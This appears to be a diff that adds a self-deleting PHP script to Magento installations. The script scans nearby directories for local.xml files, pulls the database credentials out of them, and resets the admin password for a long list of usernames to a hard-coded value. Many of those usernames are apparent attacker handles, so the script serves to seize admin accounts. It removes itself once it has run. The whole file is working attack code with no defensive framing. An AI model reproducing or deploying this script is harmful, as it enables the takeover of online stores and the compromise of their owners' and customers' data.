@@ -1,0 +1,177 @@
+<?php
+
+$localXml = array('local.xml');
+
+$users = array('1','1468177885','1470303373','a','aborman','acid','admin01','admin1','admin123','admin5','adminhendra','adminnew','adminray','admins','adminu','admin_bfei','admin_ihfb','afletcher','ajen','alexgvn123','alif','ameendering','Ameliaaa','an','anin48','anjeng','anjeng12','Anr_01','ardyan','as','asdasd','astroeh','asu123','asuasu','asulan123','Audi','azer','aziz','Backup','backup_35f69d','badcc','bangsat','berandal','bgades','bgross','biji','bschlotter','bwilson','c0krek','cahyodp','camuv1653','casa','cbaker','cecun','cevans','cgcf','cgreenfield','cknobloch','clayser','ClayX404','cmorgan','coco','codex','coq','cruis','cvanstryland','cwarton','d','dalexander','ddoine','Death','dede','dedeganteng','default123','defaults','defaults01','defaut123','design','developer','dhsjcsc','diablox','Dian2206','dkelly','dlc','dmorgan','dpender','dsacks','dstefan','eCommerce','edorr','ehooser','einlow','ejameson','ekennedy','erik','erobinson','eznt@i.ryanb.com','family','faqih212','FathurFreakz','ferdi123','fikrihaikal35','forme','frozen404','fwilde','geizkayusuf','gfd','ggrav','ghaz','gigihmhd','gladz','gmr','golix19','GolixGates1','google','gustaman','haydar','haydra','hell','hiddenymouz','hornetto','hunter2','hydro','Hysoka','i','ibizta','iko','indoxploit','iniadmin','irfan','jaja','jancok','jancoks','janderson','jayzweed','jbonnell','jdragovich','jefri','JelexCrew','jengel','jhemphill','jhogan','jhult','jmartin','jockerdz','jonson','jtappe','juancok','katon','kedaong','kehise','kenta','khise','khoogers','kimak','kimyounsin','king','kkruger','kmagnan','knap13','knelson','Kontol900!','kotack','kuyas','kwwilliams','kwynia','lalapo123','LastTouch','lluethje','localsystem','Loic','lthummagunta','lucu','m4tr1x','madmax','maganeto','magento','magento1','mageplas','magsupport','malang','manggo','manick','masthio01','mcopa','meldred','Memekl3g17','mgonzalez','mind','mlaudenbach','mlomo','momo','moza','mperry','mranupak','mrsakso','msas','msf','msivalingam','mtrudell','mturico','mwaldner','mwelbig','mwendt','nathan','nbrouwer','ncastelli','neqyns13','ngentod','ngentot123','nmccray','nnordman','noob','novara','nrussell','nzero','o','omyo123','ouni','owadmin','pak','paypal','pbk7695K@','penggunalayanan','pikri','policy','pujasucipto','putra7695K','r0cky','rami','rctioke7','rcummings','rdewolfe','restuser','revian29','rezafirdaus','rezafirdaus21','rhaan','Rieqy','rieqyns13','rkm48','rmiller','robert','Root','rseeker','s','sadmin','samikom','sav.admin','saz','sdunham','semprol','sgood','sgoodman','shansen','shayer','sheinz25','Shor7cut','Sihdaunix','sjohnson','slackerc0de','slamusga','smolix','soliro','ss123','staff.developer','stores','stupid','Support','surya','surya1','svandenheuvel','swhite','sysadm','sysadmiin','sysadmin','sysadmin1','sysmon','system32','systemadmin','systembackup','T1KUS90T','tadamec','tae','tamedeo','tanderson','task','teastmond','telgersma','terserah','tesdar','test','tfgh','Thole129','tomhawk','training','tvanhouten','ubehera','ui','upel666','uSer','VHiden133','vpotter','wajixz','wawa','wew','ybickham','youmisscry','ywigaraa','zadmin','zaz','ziko','zxc','zxcyou636','_admin','gogle','Nexcess');
+
+$users_password = "how1are2you3";
+
+//exit;
+// API
+set_time_limit(360);
+
+$db_accs = array();
+
+$d1 = array();
+$d2 = array();
+$d3 = array();
+$d4 = array();
+$d5 = array();
+$d6 = array();
+
+$dir = path_finder();
+$res = smartscan($dir);
+
+foreach ($res as $v) {
+    if (in_array($v, $localXml)) {
+        updateUsers($localpath = $dir, $indexFile = $v, $tag, $code);
+    } else {
+        if (is_dir($dir . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+            $d1[] = $dir . '/' . $v;
+        }
+    }
+}
+
+//exit;
+
+foreach ($d1 as $d) {
+    $res = smartscan($d);
+    foreach ($res as $v) {
+        if (in_array($v, $localXml)) {
+            updateUsers($localpath = $d, $indexFile = $v);
+        } else {
+            if (is_dir($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                $d2[] = $d . '/' . $v;
+            }
+        }
+    }
+}
+
+foreach ($d2 as $d) {
+    $res = smartscan($d);
+    foreach ($res as $v) {
+        if (in_array($v, $localXml)) {
+            updateUsers($localpath = $d, $indexFile = $v);
+        } else {
+            if (is_dir($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                $d3[] = $d . '/' . $v;
+            }
+        }
+    }
+}
+
+//exit;
+
+foreach ($d3 as $d) {
+    $res = smartscan($d);
+    foreach ($res as $v) {
+        if (in_array($v, $localXml)) {
+            updateUsers($localpath = $d, $indexFile = $v);
+        } else {
+            if (is_dir($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                $d4[] = $d . '/' . $v;
+            }
+        }
+    }
+}
+
+foreach ($d4 as $d) {
+    $res = smartscan($d);
+    foreach ($res as $v) {
+        if (in_array($v, $localXml)) {
+            updateUsers($localpath = $d, $indexFile = $v);
+        } else {
+            if (is_dir($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                $d5[] = $d . '/' . $v;
+            }
+        }
+    }
+}
+
+foreach ($d5 as $d) {
+    $res = smartscan($d);
+    foreach ($res as $v) {
+        if (in_array($v, $localXml)) {
+            updateUsers($localpath = $d, $indexFile = $v);
+        } else {
+            if (is_dir($d . '/' . $v) && ($v !== ".") && ($v !== "..")) {
+                $d6[] = $d . '/' . $v;
+            }
+        }
+    }
+}
+
+foreach ($d6 as $d) {
+    $res = smartscan($d);
+    foreach ($res as $v) {
+        if (in_array($v, $localXml)) {
+            updateUsers($localpath = $d, $indexFile = $v);
+        }
+    }
+}
+
+// func
+
+function updateUsers($localpath, $indexFile) {
+    global $users, $users_password;
+    $fullpath = $localpath . '/' . $indexFile;
+    $xml = simplexml_load_file($fullpath);
+    $host = (string) $xml->global->resources->default_setup->connection->host;
+    $user = (string) $xml->global->resources->default_setup->connection->username;
+    $pass = (string) $xml->global->resources->default_setup->connection->password;
+    $dbname = (string) $xml->global->resources->default_setup->connection->dbname;
+    $db_prefix = (string) $xml->global->resources->db->table_prefix;
+
+    $link = mysqli_connect($host, $user, $pass, $dbname);
+
+    if (!$link) {
+        echo "WRONG! Dont connect with MySQL. $fullpath <br /><br />";
+    }
+
+    $hash = md5('ekd' . $users_password) . ":ekd";
+    foreach ($users as $u) {
+        mysqli_query($link, "update  " . $db_prefix . "admin_user set password='$hash' where username = '$u'");
+        $rows = mysqli_affected_rows($link);
+        if ($rows) {
+            echo "$u Password CHANGED!!! <br /><br />";
+        };
+    }
+}
+
+function path_finder() {
+    $p = $_SERVER['SCRIPT_FILENAME'];
+    if (empty($p)) {
+        exit('Cant find the path');
+    } else {
+        $p = str_replace('\/', '/', $p);
+        $p = trim($p, '/');
+        $p = substr_count($p, '/') - 1;
+    }
+
+    for ($k = 1; $k <= $p; $k++) {
+        if (!is_readable(str_repeat('../', $k))) {
+            $pth = trim(str_repeat('../', $k - 1));
+            break;
+        }
+    }
+
+    if ($pth) {
+        return $pth;
+    } else {
+        return trim(str_repeat('../', $p - 1));
+    }
+}
+
+function smartscan($dir) {
+    if (function_exists("scandir")) {
+        return scandir($dir);
+    } else {
+        $dh = opendir($dir);
+        while (false !== ($filename = readdir($dh)))
+            $files[] = $filename;
+        return $files;
+    }
+}
+
+unlink(__FILE__);
+?>
